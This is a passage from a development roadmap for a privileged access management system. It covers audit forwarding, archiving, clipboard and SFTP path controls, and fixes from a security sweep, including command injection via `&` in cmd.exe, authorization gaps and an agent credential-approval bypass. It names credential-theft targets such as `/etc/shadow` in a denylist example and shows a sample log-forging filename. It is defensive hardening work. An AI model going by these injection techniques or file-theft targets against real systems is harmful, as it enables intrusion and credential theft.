- [x] Proven in the store contract (creator round-trips through grants, safe
  members and campaign items — live PostgreSQL in CI) and
  `api.TestCertificationFourEyes` (self-certify 403 + audit; another approver
  204; self-revoke 204; legacy item 204), and verified against a running
  server
- One additive migration; no new routes, no new environment variable

## Phase 47 — LEEF format + TLS transport for the SIEM forwarder ✅

The two follow-ons Phase 35 deferred on its own seam, closing them: the audit
trail — the evidence — previously left the building only as cleartext UDP/TCP.

- [x] **LEEF 2.0** (`PAM_AUDIT_FORWARD_FORMAT=leef`): IBM QRadar's native
  format — `LEEF:2.0|pamv1|<tag>|1|<action>|` + tab-separated attributes
  (`devTime` in epoch ms like CEF's `rt`, `usrName`, `msg`). Header fields
  escape `|`; attribute values strip tabs and CR/LF, so an actor name or
  detail carrying the delimiter cannot forge an attribute or a record —
  proven by an injection test
- [x] **Syslog over TLS** (`PAM_AUDIT_FORWARD_PROTO=tls`, RFC 5425):
  certificate verification is **always on** — there is deliberately no
  insecure switch, because the audit trail must never stream to an
  unauthenticated endpoint. `PAM_AUDIT_FORWARD_CA` pins the collector's CA
  (PEM bundle; empty = system roots), rejected fail-loud at startup if
  unreadable or empty, and refused outright on a non-tls proto (a typo must
  not silently drop the pinning). The syslog format uses the
  **octet-counted framing** RFC 5425 §4.3 requires; CEF and LEEF are not
  syslog and stay newline-delimited on every transport
- [x] **Proven against real sockets**: an in-process TLS collector with a
  self-signed certificate — pinned via the CA bundle — receives
  octet-counted syslog; an untrusted collector (different key) is refused,
  **no audit bytes reach it**, and the cursor stays put so the spooled event
  is delivered on the next flush through a trusted collector; plus the LEEF
  wire format and its injection resistance
- One new environment variable (`PAM_AUDIT_FORWARD_CA`); no new routes, no
  schema change

## Phase 48 — Opaque recording file names ✅

Phase 41's documented limit, closed: the recording *content* was sealed, but
the file **name** — `<unixnano>_<target>_<actor>` — still told anyone with
volume, backup or snapshot access who reached which system and when. That is
the metadata half of the same exposure.

- [x] **`PAM_RECORDING_OPAQUE_NAMES`** names a recording
  `<unixnano>_<8 random hex>`. One helper (`recording.Title`) serves all four
  recorders — interactive SSH, SSH exec, PostgreSQL and WinRM transcripts —
  and lives in `internal/recording`, which `proxy` and `api` both already
  import, so this adds no package edge
- [x] **The timestamp prefix survives** in both modes, because retention
  pruning and the newest-first listing key off the name alone; 500 names
  minted in the same nanosecond are all distinct. A `crypto/rand` failure
  falls back to the descriptive name rather than a predictable one — a
  collision would overwrite another session's evidence, which is worse than
  the metadata it hides
- [x] **The metadata moves to where reading it is already gated**:
  `GET /api/recordings` (read_audit, like replay) resolves each file's target
  and actor from the audited `session.record` / `winrm.run` event, matching on
  base name so the SSH proxy's full-path detail and the DB/WinRM bare-name
  detail both work. Best-effort — an audit read failure degrades the listing
  to names only, and an unaudited file lists empty rather than guessed. The
  console gains Target and Actor columns, so the operator experience is
  unchanged
- Opt-in, one new environment variable; no schema change, no new routes

## Phase 49 — Archive to WORM before pruning ✅

Phase 36's follow-on. Retention could *delete* aged audit rows and recordings;
deleting evidence with nowhere for it to go is only acceptable once it has been
written somewhere durable first.

- [x] **`PAM_RETENTION_ARCHIVE_DIR`** turns pruning into **archive-then-prune**.
  Aged audit rows are exported as **JSON Lines** (one complete event per line —
  a truncated array is unparseable, a truncated JSONL file still yields every
  line before the break) and aged recordings are **moved** into the archive
  rather than destroyed, preserving the artifact and its hash-chain membership
- [x] **Fail-closed, which is the point**: the prune runs **only if the archive
  succeeded**. A full, unwritable or misconfigured archive costs disk space,
  never the audit trail — proven by a test that points the archive at a
  non-directory and asserts nothing was pruned and no `audit.pruned` was emitted
- [x] **Write-once by construction**: every archived file is created with
  `O_EXCL` and mode `0400`, so a re-run cannot silently replace an artifact and
  a careless process cannot append to one; a partial write is removed rather
  than left looking complete. pamv1 cannot make storage immutable from inside
  the process — that is the operator's WORM mount — but it never overwrites
- [x] **Verifiable after the fact**: each export appends **`audit.archived`**
  with the file name, event count and the **SHA-256 of the bytes on disk**, so
  an auditor re-hashes the archive and proves it is the trail that was removed.
  Recordings get `recording.archived`
- [x] **The chained trail is now served rather than skipped**: with the HMAC
  chain on, the scheduled WORM export still runs — only the delete stays a
  manual re-anchor (deleting the chain head would break `VerifyAuditChain`), and
  the log says exactly that instead of just refusing
- Opt-in, one new environment variable; no schema change, no new routes

## Phase 50 — Clipboard auditing on the RDP bridge ✅

Phase 33's follow-on. The clipboard bridge could already be **gated** (`allow` /
`readonly` / `deny`) but never **observed**, so an allowed clipboard was an
unwatched channel into and out of a privileged desktop.

- [x] **`PAM_RDP_CLIPBOARD_AUDIT`** = `off` (default) · `meta` · `full`. The
  tunnel already frames the Guacamole stream one instruction at a time, so the
  watcher is an observer on that seam: a transfer is `clipboard` (open, with a
  mimetype) → `blob`* (base64) → `end`, and reassembling those three yields the
  direction (**out** = copied from the target, **in** = pasted into it),
  mimetype, byte count and SHA-256 — audited as **`rdp.clipboard`**
- [x] **Content is NOT recorded by default, deliberately.** A privileged
  desktop's clipboard routinely carries a password the operator just copied out
  of the vault; writing that into a trail every auditor can read would create
  the exposure this system exists to prevent. `meta` proves what moved and
  matches two transfers by digest; `full` adds the content, truncated, and is a
  separate opt-in. A typo in the setting fails startup rather than silently
  choosing either extreme
- [x] **Observation only — never interference.** Every frame is forwarded
  byte-for-byte whatever the watcher decides; a dropped frame would corrupt the
  display, and blocking the clipboard is Phase 33's gate, not this one's.
  Malformed frames are forwarded unread
- [x] **Bounded**: a transfer buffers at most 1 MiB (and a `full` audit records
  at most 4 KiB), flagged `truncated:true` rather than dropped, so a huge or
  hostile clipboard cannot exhaust memory or flood the trail. Newlines in
  recorded content are flattened, so one transfer stays one audit line and
  cannot forge a second
- [x] New `guacd.Decode` (the exact inverse of `Encode`, length-prefix
  authoritative so a value containing `,` or `;` round-trips) with tests
  covering both, plus watcher tests for each mode, non-clipboard streams,
  independent directions, and truncation

## Phase 51 — SFTP path policy ✅

Phase 32's follow-on. SFTP could be `allow` / `readonly` / `deny` — a policy
about the *operation*, never about **which file**. So a read-only session could
still download `/etc/shadow` or a private key, which is the transfer that
actually matters.

- [x] **`PAM_SSH_SFTP_DENY_FILE`** — regular expressions, one per line, `#`
  comments — matched against every SFTP path. It **reuses the `cmdguard`
  engine**, so one regex-denylist semantic (and one file format, and one
  fail-loud-on-a-bad-pattern path) covers commands and file paths alike; no
  second policy engine
- [x] **Denied in every mode, reads included.** A path you deny that an
  operator can still download is not denied at all — so the check runs before
  the read/write distinction, in `allow` mode too, and the target is never
  told the path
- [x] **A rename cannot launder a path**: both the source and destination are
  checked, so neither moving a denied file to an innocuous name nor moving an
  allowed file onto a denied one gets through
- [x] The refusal is a proper SFTP `SSH_FX_PERMISSION_DENIED` (the client sees
  an error instead of hanging) and audits `sftp.blocked` with
  `reason:path-denied` **and the pattern that matched**, so an operator can see
  *why* without guessing which rule fired
- [x] Proven against the Phase 32 harness — a real SFTP conversation, no mocks:
  a denied download refused in `allow` mode, a denied upload, a denied delete,
  both rename directions, an allowed path still working in the same session,
  and nothing bearing a denied path ever reaching the target

## Phase 52 — Close the command-injection findings ✅

The first and most serious pair from the post-beta sweep (findings **W** and
**X**), fixed together because they are the same mistake in two places: a value
an operator supplies being interpolated into a Windows command line that a shell
then parses.

- [x] **Credential dependencies can no longer carry a command.** The dependency
  `Name` and `Host` are checked against an **allowlist** — letters, digits,
  spaces and a few separators for the name, a hostname/IP shape for the host.
  An allowlist rather than a blocklist because the legitimate inputs are
  narrow and knowable, while the set of characters a shell acts on is not:
  the previous code had no check at all, and its sibling in `rotate` had a
  blocklist that missed `&`
- [x] **Checked twice, on purpose.** Validation runs at creation *and* again in
  `dependencyCommand`, the last point before the value reaches a command line —
  so a row written before this rule existed, or inserted straight into the
  database, still cannot execute. An unusable name is audited and skipped, which
  means the consumer silently does not get its password updated: the safe
  failure, and a visible one
- [x] **The path obeys command control now.** `propagateDependencies` calls
  `guardCommand` before executing, so Phase 38's "one policy on every path where
  a discrete command is visible" finally includes this one. It was the last
  WinRM execution path that bypassed it
- [x] **The `net user` username is allowlisted too** (`DOMAIN\user`,
  `user@realm`, `gMSA$` all still work), replacing a blocklist that caught
  space, quote, CR and LF but not `&`, `|`, `^`, `<`, `>`, `(`, `)` or `%` — and
  in `cmd.exe`, `&` needs no surrounding space to chain a second command
- [x] **Proven by tests that assert nothing executes**: eight break-out shapes
  and four hostile hosts refused at the API, thirteen hostile usernames refused
  in the rotator *without reaching the runner*, and eleven legitimate
  real-world names still accepted — because a security fix that breaks
  `My App Pool` or `Contoso.Web` would just be reverted
- Honest remaining limit, recorded rather than quietly closed: the dependency
  host is validated in *shape* but is still not required to be a target in the
  inventory, since a consumer may legitimately run on a host that is not itself
  a PAM target

## Phase 52a — Make `-rotate-kek` whole again ✅

Findings **I** and **J**: the documented key-rotation procedure did not survive
the features built after it. A rotation is the operation you run *because*
something went wrong, so it failing quietly is the worst possible time for it.

- [x] **Key custody is re-wrapped.** `Store` gains `ListKeyMaterial` and
  `UpdateKeyMaterial`, and `RotateVaultKEK` re-wraps the SSH proxy host key and
  the Zero Standing Privilege CA key alongside credentials, MFA secrets and
  settings. Without this the tool reported success and the **next start-up
  failed**, because key custody deliberately treats an unwrappable envelope as
  fatal — and the intuitive recovery, deleting those rows, regenerates the host
  key and the CA, which is indistinguishable from a machine-in-the-middle
- [x] **The omission is now hard to repeat.** The function's doc comment carries
  the exhaustive four-item list of what must be re-wrapped, because this bug was
  omission rather than faulty logic, and a comment that enumerates is the only
  thing that catches the fifth kind when someone adds it
- [x] **Both stores are held to it.** The contract suite covers list ordering,
  re-wrap read-back and `ErrNotFound` on an unclaimed name, so `memstore` and
  `pgstore` cannot drift apart on the new methods the way they did on list
  limits (finding AF, closed in Phase 52b)
- [x] **Verified the test fails without the fix**, rather than assuming it would
- [x] **Sealed recordings: warned, not re-wrapped — and this is the right
  answer.** A recording's data key is wrapped inside the *file*, and the SHA-256
  of those exact bytes is what the audit trail and the hash chain hold.
  Re-wrapping would make every archived recording read as *never audited*,
  destroying the tamper evidence sealing exists to provide, to avoid keeping a
  key. So `-rotate-kek` counts sealed recordings and warns, naming the KEK they
  still need, and the admin guide states the retention rule plainly
- [x] Directory reads use `os.OpenInRoot`, so "this cannot traverse" is enforced
  by the API rather than asserted in a comment

## Phase 52b — Fix the two same-day regressions, and the gap that hid them ✅

Findings **AF**, **AG** and **AL**. Both regressions shipped the same day as the
sweep that found them, and both **passed their tests** — which is the part worth
dwelling on. Neither was caught by review; both were caught by asking what the
tests were actually proving.

- [x] **`ListAudit` limit semantics are now part of the contract.** `pgstore`
  collapsed any limit above 500 back to the 100 default, so asking for *more*
  returned dramatically *fewer*, while `memstore` returned everything it had. A
  caller asking for 2000 got 2000 in tests and 100 in production. The rule now
  lives on the interface and is shared through `store.ClampAuditLimit`: a
  non-positive limit means the default page, and an oversized one is **capped,
  not reduced**
- [x] **The recordings listing no longer depends on a magic number.**
  `recordingOwners` takes the set of names the listing actually needs and stops
  as soon as they are all resolved, so the work is bounded by what is being
  displayed rather than by a constant someone guessed
- [x] **Certificate serials survive the trip to the console.**
  `SSHCert.Serial` carries the `,string` tag, so it serializes as a JSON string
  exactly as `/sign` already did. Seeded from a nanosecond clock, a real serial
  is ~1.7×10¹⁸ — above 2⁵³, where JavaScript stops representing integers
  exactly — so the console received a rounded value, and a rounded serial
  revokes nothing: the published KRL names a certificate that does not exist
  while the real one stays valid until it expires
- [x] **The tests are rebuilt to fail against the old code**, which is the actual
  lesson. The certificate test used serials 101 and 102 — small enough that the
  defect could not appear — and now uses two realistic values differing only in
  their last digit. The audit-limit contract needed more than 100 events and a
  mid-sized limit before broken and correct implementations differ at all. Both
  were verified by reintroducing the bug and watching them fail
- [x] **The root cause is closed, not just the symptoms** (finding AL): an
  interface with two implementations is only as good as the contract test
  holding them together, so limit semantics now live there instead of being
  re-invented on each side

## Phase 52c — Make the authorization gates consistent ✅

Findings **K**, **L**, **M**, **T**, **Y** and **Z**. Every one is the same class
of defect: a gate that all comparable paths enforce, missing on exactly one. That
is how this kind of bug survives review — a reviewer looking at the handler sees
nothing wrong, because the problem is only visible next to its siblings.

- [x] **The RDP tunnel stops being the exception.** It resolves its own principal
  (a browser cannot set headers on a WebSocket handshake), and that is how it
  drifted: a bare 401 instead of `authFailed`. It was the one bearer surface
  where token guessing was neither throttled nor recorded — invisible to the risk
  engine and the SIEM forwarder — while identical guessing against `/api/*` was
  both. Authorization denials are audited now too
- [x] **No self-approval on in-session step-up.** The pause exists to put a
  *second* person in the loop; self-approval turns it into a confirmation prompt
  and leaves an audit entry that reads like independent review — worse than no
  gate, because it manufactures false assurance. Checked under the same lock as
  the claim, reported distinctly from "nothing pending" so the status is honest,
  and a refused attempt leaves the step-up **still pending** for a real
  supervisor
- [x] **The broker's credential tools obey the approval gate.** With
  `require_approval` set, a human needed an approved request while an agent
  permitted `reveal_credential` got the plaintext at any hour, outside every
  window. The least-trusted actor in the system had the weakest gate
- [x] **Vendor creation applies the escalation guard.** Its role is fixed at
  `user` rather than caller-chosen, which is exactly why the check was missed —
  but a fixed role is not a safe one
- [x] **`PAM_REQUIRE_RECORDING` finally means what its name says.** It enforced
  recording for the SSH, WinRM and PostgreSQL proxies but not for the two paths
  that reach a target through the HTTP server — the in-portal RDP viewer and the
  REST WinRM endpoint. An operator who set it believed every session was
  recorded, and the two newest ways to reach a machine were the two it did not
  cover. Both checks run *before* anything happens on the target
- [x] **Audit fails closed where it already did elsewhere**: a privileged desktop
  that leaves no record of being opened is what this system exists to prevent,
  and a WinRM result the audit trail never accounted for is now withheld rather
  than returned
- [x] Tests assert the *consequence*, not just the status code: that guacd was
  never contacted, that the command never ran, that the refusal reached the audit
  trail, and that the legitimate path still works

## Phase 52d — Lifetimes, deadlines and fail-open defaults ✅

Findings **N**, **O**, **P**, **Q**, **AA** and **AB**. This batch is about
things that were *almost* right: a guard that fired on one of its two triggers, a
timeout that applied to the wrong kind of response, a sweep that was never
scheduled, a failure that was reported as success.

- [x] **A killed command actually stops now.** `execGuard` closed the SSH session
  only on a deadline, never on cancellation — so an `ssh_exec` killed from the
  console reported "session terminated" to the operator while the command kept
  running on the target. The exclusion was deliberate (the stop func cancelled
  the same context, so treating cancellation as a trigger would have closed every
  successful run) but it disabled the case that matters most. Now three separate
  signals — a timer, the caller's context, and normal completion
- [x] **Live monitoring is no longer cut off after 30 seconds.** The root cause
  was not the timeout: it was the access-log wrapper having no `Unwrap`, so
  `http.ResponseController` could not reach the connection to clear the deadline.
  Adding `Unwrap` generalises the hand-written `Flush` and `Hijack` passthroughs
  that had each been added after something broke
- [x] **Verified in both directions rather than assumed.** An SSE stream under a
  1s write timeout delivers one frame and dies; clearing the deadline delivers
  all of them. And the WebSocket path — the RDP viewer — turns out **not** to
  inherit the deadline, so it needed no change and did not get a speculative one
- [x] **Neither proxy will hold a slot for an unauthenticated peer.** Both now
  bound the handshake (30 seconds here, raised to 120 in Phase 52g once it was
  measured cutting off a human typing the API key) and clear the deadline once
  authenticated,
  since an established session is legitimately idle while an operator reads
- [x] **Expired login sessions are collected.** Expiry was enforced by filtering
  reads, never by deleting rows, so every login, break-glass activation and
  60-second RDP token left a row behind forever. The GC loop also used to start
  *only* when a broker policy file was configured — so the ordinary deployment
  had no garbage collection at all
- [x] **A failed kill says so.** The cluster broadcast error was discarded and
  the outcome computed from "is a bus configured", so an operator cutting off a
  live privileged session on another replica was told it worked
- [x] **A policy file that yields nothing is fatal, not silently inert.** Setting
  `PAM_COMMAND_DENY_FILE` (or the SFTP/step-up equivalents) is a statement of
  intent; an unmounted ConfigMap used to disable the control while startup logged
  it as enabled. `ParseDeny` also no longer runs a `bufio.Scanner`, whose 64 KiB
  token limit silently discarded every pattern after one long line — with its
  `Err()` unchecked, a half-loaded policy looked exactly like a loaded one

## Phase 52e — Audit-trail integrity, archiving, and two concurrency bugs ✅

The last nine findings from the post-beta sweep (**R**, **S**, **AC**, **AD**,
**AE**, **AH**, **AI**, **AJ**, **AK**).

- [x] **The audit trail stops accepting unauthenticated, unbounded input.** Both
  proxies log without appending on the throttled branch — the failures *before*
  the throttle are the signal, and one row per attempt under a flood makes the
  system of record the amplifier, which bites hardest with the HMAC chain on
  because those rows are then deliberately never pruned. Client-supplied paths,
  patterns and request paths are quoted and bounded, so a filename of
  `x reason:allowed op:read` can no longer read as three legitimate fields
- [x] **SSE framing escapes CR as well as LF.** Server-Sent Events treats both as
  end-of-line, and the data being escaped is deliberately CRLF-bearing — so a
  supervisor's view of a live session could be split into frames the session
  never produced
- [x] **The OIDC JWKS and discovery reads are bounded**, matching the token
  endpoint eight lines away
- [x] **Archiving no longer duplicates the whole trail every tick.** With the
  chain enabled the aged rows are never pruned, so exporting everything older
  than a moving cutoff rewrote all of history under a new name each pass, into
  storage that is immutable and usually billed. It now archives only the delta,
  with the high-water mark read from the audit trail itself — the fact was
  already recorded there, and a mark kept elsewhere could disagree with the
  archives that exist
- [x] **One stuck recording no longer wedges archiving forever.** An interrupted
  move (copy succeeded, remove failed) is now finished rather than treated as a
  collision, a real collision is still refused, and the sweep continues past a
  failure instead of stopping — with names sorted and timestamp-led, stopping
  blocked every later recording permanently
- [x] **A data race on the operator's SSH channel is closed.** Phase 51's path
  denylist made refusals possible in the default mode, so the inspector's status
  packet could interleave with target output mid-response. The test asserts the
  property that matters — every payload arrives *whole* — not just the absence
  of a crash
- [x] **Batched Guacamole instructions can no longer evade clipboard auditing.**
  The protocol has no one-instruction-per-message rule and the bridge forwards
  whole messages, so a leading `nop` used to carry the clipboard and blob
  instructions past inspection unexamined
- [x] **A certification revoke cuts the user's live sessions**, as the equivalent
  grant-delete route already did. A campaign whose purpose is deciding someone
  should no longer have access was removing the grant and leaving them connected
- [x] **MFA recovery codes carry 120 bits instead of 50.** They are a full
  second-factor bypass, valid until used, stored as an unsalted SHA-256 — so they
  are attacked offline from a backup, where rate limiting cannot reach. Plain
  SHA-256 stays, and the reasoning is in the code: precomputation needs a small
  input space, and the fix for a generated secret is to stop generating it small

## Phase 52f — Make the archive high-water mark robust ✅

Reviewing Phase 52e's own change surfaced a weakness in it, which is the more
interesting half of this phase.

- [x] **The archive high-water mark can no longer be lost.** Phase 52e stopped
  the archiver re-exporting the entire aged trail every tick by starting from the
  newest `audit.archived` event — but it *found* that marker by scanning a page
  of recent audit events. On a busy deployment the marker falls off the end of
  any fixed window, and once lost the archiver re-exports history that is already
  archived: the very duplication the delta logic was added to stop, just less
  often and considerably harder to notice
- [x] **`Store.LatestAuditByAction`** — a targeted lookup bounded by `LIMIT 1`
  rather than by a page size that can miss the row, implemented in both backends
  and held by the contract suite, returning `(nil, nil)` when there is no such
  event. It runs from periodic maintenance rather than a request path, so an
  index scan on id descending is an acceptable cost — and a wrong answer here is
  worse than a slow one
- [x] **The guides caught up with Phase 52e's two format changes**: audit details
  now quote client-supplied paths and patterns, and recovery codes are four
  groups of six rather than two of five (codes already issued keep working, since
  only their hashes are stored and the lookup hashes whatever is typed —
  verified, not assumed)
- [x] The admin guide also records that `PAM_REQUIRE_RECORDING` now covers the
  RDP viewer and the REST WinRM endpoint, so a deployment that sets it without a
  recording path will refuse those sessions rather than run them unrecorded, and
  that an unusable deny file is now fatal at startup

## Phase 52g — Fix what the review of the fixes found ✅

Thirty findings across six phases is itself a change large enough to warrant
review, so the merged work was re-reviewed against one question — *what did these
commits break?* — with an explicit instruction to hunt for **tests that cannot
fail**. It found six things, all reproduced, all fixed here. Two are worth
knowing about even in summary:

- [x] **The dependency allowlist rejected `$`, which Windows requires.** A named
  SQL Server instance registers `MSSQL$SQLEXPRESS` — the textbook
  credential-dependency case for a PAM. And it was retroactive and silent: the
  same check runs when the command is built, so an *existing* row would be
  skipped at rotation, changing the account's password on the target and leaving
  SQL Server holding a stale one until its next restart failed. The sibling
  allowlist for `net user`, added in the same commit, accepted `$` for gMSA
  accounts — the two disagreed about what a legal Windows name is
- [x] **The new handshake deadline cut off human password entry.** Thirty seconds
  covers the whole pre-authentication phase, which in the documented flow
  includes an operator typing or pasting the API key. Reproduced: a client taking
  32 seconds was dropped with no message and no audit event, which looks exactly
  like a broken server. Now 120s, matching OpenSSH's `LoginGraceTime`
- [x] **A new test could not fail.** `TestSyncWriterKeepsPayloadsWhole` passed
  with the mutex removed — its destination recorded each write as one block under
  its own lock, so every block was intact whether or not anything was serialized.
  Rewritten against a destination that copies in two halves with a scheduling
  point between them, and verified to fail without the mutex
- [x] The clipboard fix was incomplete (a frame completing several transfers
  audited only the last), the audit **actor** on a failed proxy auth was still
  unbounded, and the recordings listing read 5000 audit rows per console refresh
- [x] Every production function in the tree now carries a doc comment

The lesson from the untestable test generalises: last round's discipline was
"verify the test fails without the fix", and it was applied to tests written for
known bugs but not to one written for a race. A test asserting that nothing went
wrong is the easiest kind to write and the easiest to get wrong.

### The post-beta sweep (2026-07-27) — all thirty findings closed ✅

The second full read-only sweep found **thirty** issues, every one confirmed by
reading the code. All are now fixed, across phases 52–52e — with 52f and 52g
closing what reviewing those fixes then found. The detail of each fix lives in
**[docs/SECURITY-GAPS.md](docs/SECURITY-GAPS.md#the-2026-07-27-post-beta-sweep--all-30-findings-now-closed)**.

| Phase | What it closed |
|---|---|
| **52** | Command injection: credential dependencies (RCE) and the `net user` blocklist |
| **52a** | `-rotate-kek` re-wraps key custody; sealed recordings documented rather than broken |
| **52b** | The two same-day regressions, and the store-contract gap that hid one |
| **52c** | Six authorization gates that did not match their peers |
| **52d** | Lifetimes, deadlines and fail-open defaults |
| **52e** | Audit-trail integrity, archiving, and two concurrency bugs |
| **52f** | The archive high-water mark, made robust — found by reviewing 52e |
| **52g** | Six more, found by reviewing all of the above — including a test that could not fail |

Three things worth carrying forward:

- **Two findings were regressions introduced the same day, and both passed their
  tests.** One test used certificate serials small enough that the defect could
  not appear; the other used the in-memory store, which was the generous
  implementation. Where practical each fix's test was then verified to **fail
  against the old code**, not merely pass against the new
- **The obvious fix was sometimes the wrong one.** Re-wrapping sealed recordings
  during a KEK rotation would have destroyed the tamper evidence they exist to
  provide, so that is resolved as a documented retention rule plus a warning
- **One suspected finding was not one.** Verifying the write-timeout problem in
  both directions showed hijacked WebSockets do not inherit the server deadline,
  so the RDP viewer correctly got no change

## Phase 53 — SQL Server (TDS) session proxy ✅

The second database wire protocol, and the first new one since Phase 15. An
operator points `sqlcmd` (or any TDS client) at pamv1 with
`-U '<dbcred>@<target>'` and their PAM key as the password; the proxy runs the
same authorization gates as every other listener, injects the vaulted SQL login
just-in-time, and brokers the protocol with per-statement audit.

- [x] **`internal/tds`** — the protocol slice a broker needs, hand-rolled with **no new dependency**: packet framing (bounded reassembly; `RESETCONNECTION` preserved through re-framing, or connection pooling breaks silently), PRELOGIN, LOGIN7 parse + re-encode, the keyless password obfuscation, SQLBatch/RPC text extraction, ERROR/DONE refusal tokens, a login-response walker, and a **TLS-inside-TDS-packets handshake shim** (the flush-on-read handoff is where hand-rolled versions hang)
- [x] **`internal/proxy/mssqlproxy.go`** — a line-for-line sibling of `dbproxy.go`, so the two diff cleanly: anything that differs is the transport, never the policy. Same gate order (rate limit → resolve → MFA-enrollment → `CapConnect` → target/protocol → grants → approval consume → vendor window → session cap → **fail-closed audit** → JIT decrypt → dial), same recording, live hub, registry, step-up and post-session rotation
- [x] **JIT injection into the client's own LOGIN7**: username and password replaced, `fIntSecurity` cleared, everything else (hostname, appname, database, language, feature extensions, negotiated version and packet size) forwarded byte-identical — by **re-encoding**, since a credential of a different length shifts every offset and an in-place patch would corrupt the login
- [x] **Command control and audit see through `sp_executesql`** (by name and ProcID, plain and PLP): a procedure-name-only parser would leave every parameterised driver — which is to say every application — unaudited and unfiltered. An unrecoverable RPC degrades to an audited `[rpc <name>]` and is forwarded, the same call the PostgreSQL proxy makes for a fast-path function call
- [x] **Encryption stance**: whole-session TLS on both legs (`ENCRYPT_ON` when `PAM_TLS_CERT/KEY` are set, always requested upstream), `PAM_DB_UPSTREAM_CA`/`_TLS_VERIFY` fail-closed as on the PostgreSQL leg, and TDS's **login-packet-only mode is never selected** — it reverts to plaintext mid-stream, which is where silent-downgrade bugs live. MARS is disabled so requests stay parseable; integrated/Windows auth and TDS 8.0 strict encryption are refused with a clear message instead of a hang
- [x] **No new audit vocabulary**: `db.session.*`, `db.query`, `command.blocked` and `db.stepup_*` disambiguated by `via:mssql`, so OCSF export and threat analytics cover SQL Server sessions without a change
- [x] **Config + surface**: `PAM_MSSQL_ADDR` (default `off`, `off` sentinel case-insensitive like its siblings); protocol `mssql` in the API enum, the 5250 target screens, the session registry and discovery (port 1433); shared database TLS built once in `main` for both listeners
- [x] **Tests**: 15 codec tests pinned to **spec-derived byte literals** — not round-trips, because the fake upstream uses the same codec and a symmetric bug would round-trip happily through every end-to-end test — plus a real TLS-over-TDS handshake; and 13 proxy tests: the JIT proof against an upstream accepting **only** the vaulted secret, wrong-key refused before the upstream is touched, client login fields preserved, a blocked batch **and** a blocked `sp_executesql` (neither reaches the target, session survives), multi-packet reassembly, recording + require-recording, live monitoring, kill, wrong-protocol and enrollment-only refusals
- Deferred (documented): **interop against a real SQL Server is not verified** — no licensed instance in CI, catalogued in [EXTERNAL-INFRA-GAPS.md](docs/EXTERNAL-INFRA-GAPS.md) with the `mcr.microsoft.com/mssql/server` job that would close it. Also deferred: MySQL/Oracle (same pattern, new protocols), result-row redaction, and mid-session packet-size renegotiation

## Phase 54 — VNC connector ✅

The second graphical protocol, and the cheapest one the architecture ever
absorbed: guacd already speaks VNC, so the work was making pamv1's *gates* speak
it — without growing a second copy of them.

- [x] **One tunnel, two protocols.** `rdpTunnel` became `viewerTunnel(proto)` in `internal/api/viewer_handlers.go` (renamed from `rdp_handlers.go`), parameterised by a small `viewerProto` descriptor (name, label, default port, session scope, guacd extras). Every gate — token resolve, break-glass note, MFA-enrollment, `CapConnect`, target lookup, protocol match, protocol allowlist, effective grants, single-use approval consume, vendor contract window, session cap, JIT decrypt, require-recording, fail-closed start audit, registry, clipboard watcher — is executed **once, in one function**, for both. Duplicating them is how two paths that are supposed to be equivalent quietly stop being; Phase 52c was a whole pass fixing exactly that
- [x] **`vnc` is a first-class protocol**: API enum + 422 message, portal add/change `<select>`s, session registry, discovery (port 5900), and the protocol allowlist (`PAM_ALLOWED_PROTOCOLS=ssh,rdp` now excludes VNC as you would expect)
- [x] **In-portal viewer**: `POST /api/vnc-token` + `GET /api/targets/{id}/vnc`, rendered by the same vendored Guacamole client on the same overlay. The portal's option **7** now opens whichever viewer the target's protocol names — one key, two protocols
- [x] **Tunnel-scoped tokens**: `auth.SessionScopeVNC` joins `SessionScopeRDP` behind a new `auth.IsViewerScope`, which is what confers `TunnelOnly`. Routing the check through one function is deliberate — a scope added without it would hand out a **full API token in a query string**, and there is now a test that would catch it
- [x] **The clipboard gate covers VNC** (`disable-copy`/`disable-paste`, the same pair guacd accepts for both), including the per-target override from the Phase 33 follow-on, and **`enable-sftp` is forced off** — VNC's file-transfer channel, the analog of RDP drive redirection
- [x] **Fail closed when the gate cannot be applied.** guacd silently *drops* a parameter it did not advertise, so a guacd that cannot gate the clipboard would render an ungated desktop while the portal showed the policy in force. `guacd.Conn.Supports` exposes the advertised argument list and a non-permissive policy that cannot be applied now **refuses the session** (`vnc.refused … reason:clipboard-unenforceable`). The check protects RDP too
- [x] **Audit vocabulary**: `vnc.token`, `vnc.connect`, `vnc.end`, `vnc.refused`, `vnc.error`, `vnc.clipboard` — mirroring the RDP set, so the SIEM export and threat analytics need no change
- [x] **Tests**: end to end against a fake guacd advertising the **real** VNC argument list (from guacamole-server's `GUAC_VNC_CLIENT_ARGS`) — `select vnc`, the vaulted secret injected into guacd's handshake, `enable-sftp=false` on the wire; the clipboard policy reaching guacd; the fail-closed refusal when it cannot; and the tunnel-scoped-token property. Every existing RDP test passes unchanged, which is the point of the shared implementation
- [x] **A real desktop to look at**: `deploy/docker/docker-compose.vnc-demo.yml` + `vnc-target/` run TigerVNC + XFCE behind guacd, seeded as a `vnc` target — the VNC sibling of the RDP demo
- Deferred (documented): VNC has **no transport security and no server authentication**, and its password is DES-truncated to 8 characters — stated in [PROTOCOLS-AND-CRYPTO.md §3.5](docs/PROTOCOLS-AND-CRYPTO.md) rather than papered over; prefer RDP or SSH where the choice exists. Rendered pixels against every VNC server implementation remain unverified beyond the demo stack

## Phase 55 — Cross-replica live monitoring ✅

Closes the deferral Phase 34 recorded when it made the kill-switch cluster-wide:
in an HA deployment, `GET /api/sessions` listed only whichever pod the load
balancer picked, and a supervisor's SSE watch 404ed unless it happened to land
on the pod hosting the session. Now a supervisor can **see it, watch it, kill it
and see it end — all from the wrong replica.**

- [x] **One more store bus, same pattern as the kill bus** (`internal/session/livebus.go`,
  `session.LiveStore` in the `store.Store` contract): pgstore rides Postgres
  `LISTEN`/`NOTIFY` — frames + interest multiplexed on **one** dedicated,
  reconnecting listener connection (`pgstore/livebus.go`) — and memstore fans out
  in-process, so the demo and the tests drive exactly the code the HA path runs.
  No new environment variables: it activates with the store, best-effort like the
  kill bus (a failed subscribe logs and stays replica-local)
- [x] **Interest-gated forwarding**, because session *bytes* are a heavier cargo
  than a kill signal: a replica forwards a session's output onto the bus **only
  while some replica has announced a live watcher** for it (announcements repeat
  every 10s and expire by silence after 30s, so a crashed watcher stops the flow
  without a goodbye). An unwatched session never touches the bus. The `Hub` is
  the single tee point, so every protocol that live-streams — SSH, PostgreSQL,
  SQL Server, WinRM (interactive, REST and broker) — crossed replicas in one
  change, and `HasSubscribers` counts remote interest so the WinRM
  skip-build-if-unwatched optimization stays honest
- [x] **Cluster-wide inventory** (migration `0025`, **UNLOGGED** `live_sessions`):
  each replica upserts its sessions (heartbeat-refreshed every 15s), listings
